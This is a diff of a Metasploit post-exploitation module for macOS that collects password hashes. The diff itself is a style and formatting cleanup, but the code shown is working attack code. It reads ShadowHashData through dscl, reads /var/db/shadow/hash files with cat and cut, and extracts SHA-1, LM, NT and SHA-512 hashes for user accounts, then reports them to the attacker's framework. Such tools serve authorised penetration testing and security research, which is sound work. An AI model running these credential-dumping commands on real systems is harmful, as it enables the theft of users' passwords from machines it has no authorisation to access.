@@ -7,31 +7,35 @@ require 'rexml/document'
 
 class MetasploitModule < Msf::Post
   # set of accounts to ignore while pilfering data
-  #OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
+  # OSX_IGNORE_ACCOUNTS = ["Shared", ".localized"]
 
   include Msf::Post::File
   include Msf::Post::OSX::Priv
   include Msf::Post::OSX::System
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'OS X Gather Mac OS X Password Hash Collector',
-        'Description'   => %q{
-            This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
-            versions 10.3 to 10.14.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'OS X Gather Mac OS X Password Hash Collector',
+        'Description' => %q{
+          This module dumps SHA-1, LM, NT, and SHA-512 Hashes on OSX. Supports
+          versions 10.3 to 10.14.
         },
-        'License'       => MSF_LICENSE,
-        'Author'        => [
+        'License' => MSF_LICENSE,
+        'Author' => [
           'Carlos Perez <carlos_perez[at]darkoperator.com>',
           'hammackj <jacob.hammack[at]hammackj.com>',
           'joev'
         ],
-        'Platform'      => [ 'osx' ],
-        'SessionTypes'  => [ 'shell' ]
-      ))
+        'Platform' => [ 'osx' ],
+        'SessionTypes' => [ 'shell' ]
+      )
+    )
     register_options([
-      OptRegexp.new('MATCHUSER', [false,
+      OptRegexp.new('MATCHUSER', [
+        false,
         'Only attempt to grab hashes for users whose name matches this regex'
       ])
     ])
@@ -47,6 +51,7 @@ class MetasploitModule < Msf::Post
     get_nonsystem_accounts.each do |user_info|
       user = user_info['name']
       next if datastore['MATCHUSER'].present? and datastore['MATCHUSER'] !~ user
+
       print_status "Attempting to grab shadow for user #{user}..."
       if gt_lion? # 10.8+
         # pull the shadow from dscl
@@ -55,7 +60,7 @@ class MetasploitModule < Msf::Post
 
         # on 10.8+ ShadowHashData stores a binary plist inside of the user.plist
         # Here we pull out the binary plist bytes and use built-in plutil to convert to xml
-        plist_bytes = shadow_bytes.split('').each_slice(2).map{|s| "\\x#{s[0]}#{s[1]}"}.join
+        plist_bytes = shadow_bytes.split('').each_slice(2).map { |s| "\\x#{s[0]}#{s[1]}" }.join
 
         # encode the bytes as \x hex string, print using bash's echo, and pass to plutil
         shadow_plist = cmd_exec("/bin/bash -c 'echo -ne \"#{plist_bytes}\" | plutil -convert xml1 - -o -'")
@@ -89,21 +94,21 @@ class MetasploitModule < Msf::Post
         # original regex left for historical purposes.  During testing it was discovered that
         # 4f110200 was also a valid end.  Instead of looking for the end, since its a hash (known
         # length) we can just set the length
-        #sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
+        # sha512 = hash_decoded.scan(/^\w*4f1044(\w*)(080b190|080d101e31)/)[0][0]
         sha512 = hash_decoded.scan(/^\w*4f1044(\w{136})/)[0][0]
         report_hash("SHA-512", sha512, user)
       else # 10.6 and below
         # On 10.6 and below, SHA-1 is used for encryption
         guid = if gte_leopard?
-          cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
-        elsif lte_tiger?
-          cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
-        end
+                 cmd_exec("/usr/bin/dscl localhost -read /Search/Users/#{user} | grep GeneratedUID | cut -c15-").chomp
+               elsif lte_tiger?
+                 cmd_exec("/usr/bin/niutil -readprop . /users/#{user} generateduid").chomp
+               end
 
         # Extract the hashes
         sha1_hash = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c169-216").chomp
-        nt_hash   = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c1-32").chomp
-        lm_hash   = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c33-64").chomp
+        nt_hash = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c1-32").chomp
+        lm_hash = cmd_exec("cat /var/db/shadow/hash/#{guid} | cut -c33-64").chomp
 
         # Check that we have the hashes and save them
         if sha1_hash !~ /0000000000000000000000000/
@@ -148,9 +153,9 @@ class MetasploitModule < Msf::Post
 
   # parse the dslocal plist in lion
   def read_ds_xml_plist(plist_content)
-    doc  = REXML::Document.new(plist_content)
+    doc = REXML::Document.new(plist_content)
     keys = []
-    doc.elements.each("plist/dict/key")  { |n| keys << n.text }
+    doc.elements.each("plist/dict/key") { |n| keys << n.text }
 
     fields = {}
     i = 0
@@ -160,12 +165,12 @@ class MetasploitModule < Msf::Post
       element.each_element("*") do |thing|
         data_set = thing.text
         if data_set
-          data << data_set.gsub("\n\t\t","")
+          data << data_set.gsub("\n\t\t", "")
         else
           data << data_set
         end
       end
-      i+=1
+      i += 1
     end
     return fields
   end
@@ -173,6 +178,7 @@ class MetasploitModule < Msf::Post
   # reports the hash info to metasploit backend
   def report_hash(type, hash, user)
     return unless hash.present?
+
     print_good("#{type}:#{user}:#{hash}")
     case type
     when "NT"
@@ -214,6 +220,7 @@ class MetasploitModule < Msf::Post
   def grab_shadow_blob(user)
     shadow_bytes = cmd_exec("dscl . read /Users/#{user} dsAttrTypeNative:ShadowHashData").gsub(/\s+/, '')
     return nil unless shadow_bytes.start_with? 'dsAttrTypeNative:ShadowHashData:'
+
     # strip the other bytes
     shadow_bytes.sub!(/^dsAttrTypeNative:ShadowHashData:/, '')
   end
